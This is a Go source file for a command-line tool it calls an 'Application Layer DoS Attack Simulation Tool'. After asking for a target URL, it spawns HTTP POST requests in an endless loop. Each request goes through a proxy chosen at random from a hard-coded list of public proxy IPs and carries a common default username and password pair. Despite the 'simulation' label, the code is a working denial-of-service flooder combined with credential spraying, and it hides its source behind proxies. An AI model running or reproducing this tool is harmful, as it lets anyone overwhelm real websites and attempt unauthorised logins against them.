package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
)

// Define colors
const (
	RED   = "\033[0;31m"
	GREEN = "\033[0;32m"
	NC    = "\033[0m" // No Color
)

var (
	payloads = []string{
		"username=admin&password=password",
		"username=root&password=123456",
		"username=test&password=test123",
		"username=admin&password=admin",
		"username=root&password=toor",
		"username=guest&password=guest",
		"username=admin&password=123456",
		"username=root&password=password",
		"username=test&password=password123",
		"username=admin&password=pass123",
	}

	proxyServers = []string{
		"8.210.54.50:10081",
		"45.76.15.12:11969",
		"45.70.30.196:5566",
		"223.155.121.75:3128",
		"108.175.24.1:13135",
	}

	// TrapCtrlC channel to handle Ctrl+C interruption
	TrapCtrlC = make(chan os.Signal, 1)
)

func main() {
	fmt.Println(GREEN + "Application Layer DoS Attack Simulation Tool" + NC)
	fmt.Println(GREEN + "--------------------------------------------" + NC)

	reader := bufio.NewReader(os.Stdin)

	fmt.Print(RED + "Enter your target website link: " + NC)
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	fmt.Println(RED + "DoS attack will be performed on: " + targetURL + NC)

	fmt.Print(RED + "Do you want to continue with the DoS attack? (y/n): " + NC)
	continueAttack, _ := reader.ReadString('\n')
	continueAttack = strings.TrimSpace(continueAttack)

	if strings.ToLower(continueAttack) == "y" {
		go handleCtrlC() // Trap Ctrl+C

		// Perform Application Layer DoS Attack Simulation
		simulateApplicationLayerDosAttack(targetURL)
	} else {
		fmt.Println(GREEN + "DoS attack aborted." + NC)
	}
}

// handleCtrlC traps Ctrl+C signal to gracefully exit the program
func handleCtrlC() {
	signal.Notify(TrapCtrlC, os.Interrupt)
	<-TrapCtrlC
	fmt.Println("\n" + RED + "DoS attack stopped." + NC)
	os.Exit(0)
}

// simulateApplicationLayerDosAttack simulates an Application Layer DoS Attack
func simulateApplicationLayerDosAttack(targetURL string) {
	fmt.Println(GREEN + "Simulating Application Layer DoS Attack on " + targetURL + "..." + NC)

	// Infinite loop for continuous attack
	for {
		// Select a random payload from the array
		randomIndex := rand.Intn(len(payloads))
		payload := payloads[randomIndex]

		// Select a random proxy server from the array
		randomProxyIndex := rand.Intn(len(proxyServers))
		proxyServer := proxyServers[randomProxyIndex]

		// Send HTTP POST request with the selected payload using the proxy server
		go sendHTTPRequest(targetURL, payload, proxyServer)
	}
}

// sendHTTPRequest sends HTTP POST request with payload using proxy server
func sendHTTPRequest(targetURL, payload, proxyServer string) {
	proxyURL, _ := url.Parse("http://" + proxyServer)
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	req, _ := http.NewRequest("POST", targetURL, strings.NewReader(payload))
	_, err := client.Do(req)
	if err != nil {
		fmt.Println("Error:", err)
	}
}
